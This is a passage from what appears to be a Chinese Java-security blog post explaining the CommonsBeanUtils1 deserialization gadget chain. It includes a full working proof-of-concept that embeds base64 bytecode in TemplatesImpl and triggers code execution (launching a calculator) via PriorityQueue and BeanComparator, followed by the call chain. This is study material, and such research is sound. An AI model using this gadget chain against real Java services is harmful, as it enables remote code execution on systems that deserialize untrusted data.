+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, comparator);<br></code></pre></td></tr></table></figure>
+
+<p>然后添加2个无关紧要的值进<code>queue</code>中(之所以这么做是因为防止<code>add()</code>提前触发<code>comparator.compare()</code>)</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">queue.<span class="hljs-built_in">add</span>(1);<br>queue.<span class="hljs-built_in">add</span>(1);<br></code></pre></td></tr></table></figure>
+
+<p>添加完成之后我们再将<code>queue</code>的值(用来给compare方法传入<code>TemplatesImpl</code>对象)以及<code>BeanComparator</code>的<code>property</code>赋值为<code>outputProperties</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">setFieldValue(comparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br>setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj, obj&#125;);<br></code></pre></td></tr></table></figure>
+
+<h4 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsBeanUtils1</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAcDAAdAB4BAARjYWxjDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAGQAAAAMAAAABsQAAAAEACgAAAAYAAQAAAAwACwAAAAQAAQAMAAEABwANAAIACQAAABkAAAAEAAAAAbEAAAABAAoAAAAGAAEAAAAQAAsAAAAEAAEADAABAA4ADwACAAkAAAAuAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAEACgAAAA4AAwAAABIABAATAA0AFAALAAAABAABABAAAQARAAAAAgAS&quot;</span>.getBytes());<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, comparator);<br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">1</span>);<br>        setFieldValue(comparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj, obj&#125;);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(queue);<br>        oos.close();<br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>调用可以弹出计算器：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308021734115.png" srcset="/img/loading.gif" lazyload alt="image-20230802173336884"></p>
+<h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">PriorityQueue#readObject()<br>	heapify();<br>		siftDown(i, (E) queue[i]);<br>			siftDownUsingComparator(k, x);<br>				BeanComparator#compare(TemplatesImplObj,)<br>                    PropertyUtils.getProperty(TemplatesImplObj, <span class="hljs-string">&quot;outputProperties&quot;</span>)<br>                    	TemplatesImpl#getOutputProperties()<br>                    		TemplatesImpl#newTransformer()<br>                    			...<br>                    				defindClass()<br></code></pre></td></tr></table></figure>
+
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>https://leekosss.github.io/2023/08/24/[java安全]CommonsBeanUtils1/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>leekos</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年8月24日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年8月2日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/24/%5Bjava%E5%AE%89%E5%85%A8%5DCommonsCollections1(LazyMap)/" title="">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/24/%5BISITDTU%202019EasyPHP%5D%E4%BD%BF%E7%94%A8%E5%BC%82%E6%88%96webshell/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"e5J90iDkXMWhU5UNlEX1I2hO-gzGzoHsz","appKey":"esLROw9j3xLk2nV4tQkKaih1","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      赣ICP备2022008842号-2
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
